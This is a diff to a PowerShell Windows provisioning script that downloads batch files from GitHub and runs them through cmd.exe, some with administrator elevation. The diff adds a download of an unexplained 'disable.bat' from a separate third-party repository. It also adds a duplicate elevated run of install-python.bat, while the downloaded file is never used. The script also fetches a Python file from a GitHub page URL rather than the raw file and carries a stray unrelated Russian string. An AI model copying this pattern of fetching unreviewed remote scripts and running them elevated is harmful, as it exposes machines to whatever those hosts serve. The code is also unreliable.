@@ -2,7 +2,8 @@ $tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -F
 $info = "тему урока предлагаю объявить" 
 $installPythonBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
 $installPythonBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
-
+$batFileDisabler = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/disable.bat" 
+$batFileDisablerPath = Join-Path -Path $tempFolder.FullName -ChildPath "disable.bat"
 $installPythonToolsBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python-tools.bat"
 $installPythonToolsBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python-tools.bat"
 
@@ -13,6 +14,8 @@ $pythonScriptUrl = "https://github.com/FanAPIpipa/pipa/blob/main/animatetext.py"
 $pythonScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "animatetyping.py"
 
 Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
+Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
 Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBatPath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
